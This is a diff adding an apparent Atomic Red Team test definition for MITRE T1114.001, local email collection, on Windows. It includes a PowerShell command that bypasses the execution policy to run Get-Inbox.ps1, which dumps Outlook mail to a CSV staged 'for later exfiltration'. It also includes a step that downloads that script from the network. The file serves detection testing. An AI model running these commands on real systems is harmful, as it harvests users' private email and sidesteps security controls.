@@ -1,0 +1,42 @@
+{
+    "name": "Email Collection with PowerShell Get-Inbox",
+    "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration. Successful execution will produce stdout message stating Please be patient, this may take some time.... Upon completion, final output will be a mail.csv file.  Note: Outlook is required, but no email account necessary to produce artifacts. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "powershell -executionpolicy bypass -command \"#{file_path}\\Get-Inbox.ps1\" -file #{output_file}\n",
+        "cleanup_command": "Remove-Item #{output_file} -Force -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1114.001",
+    "tactics": [
+        "Collection"
+    ],
+    "technique": "Local Email Collection",
+    "source": "ART",
+    "uuid": "3f1b5096-0139-4736-9b78-19bcb02bb1cb",
+    "arguments": {
+        "output_file": {
+            "description": "Output file path",
+            "type": "string",
+            "default": "$env:TEMP\\mail.csv"
+        },
+        "file_path": {
+            "description": "File path for Get-Inbox.ps1",
+            "type": "string",
+            "default": "PathToAtomicsFolder\\T1114.001\\src"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Get-Inbox.ps1 must be located at #{file_path}\n",
+            "prereq_command": "if (Test-Path \"#{file_path}\\Get-Inbox.ps1\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114.001/src/Get-Inbox.ps1\" -OutFile \"#{file_path}\\Get-Inbox.ps1\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
